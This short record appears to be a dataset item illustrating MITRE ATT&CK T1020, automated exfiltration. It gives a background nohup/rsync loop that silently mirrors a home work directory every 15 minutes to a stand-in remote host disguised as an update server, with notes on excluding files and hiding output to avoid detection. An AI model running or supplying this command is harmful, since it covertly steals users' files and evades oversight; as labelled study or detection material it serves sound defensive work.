command: nohup bash -c 'while sleep 900; do rsync -azq --delete --exclude=\*.tmp --exclude=\*.cache $HOME/Work/ backup@updates.example.org:.local/.w/$HOSTNAME/; done' >/dev/null 2>&1 &
explanation: Automates periodic exfiltration every 15 minutes using rsync to continuously mirror a working directory to a remote host, fitting T1020’s automated data transfer pattern.
rationale_steps: Establish a loop to automate regular transfers.
Mirror contents with --delete to maintain a clean remote mirror.
Exclude noisy/temp files to reduce volume and detection.
Run with nohup and redirect all output to /dev/null for stealth.
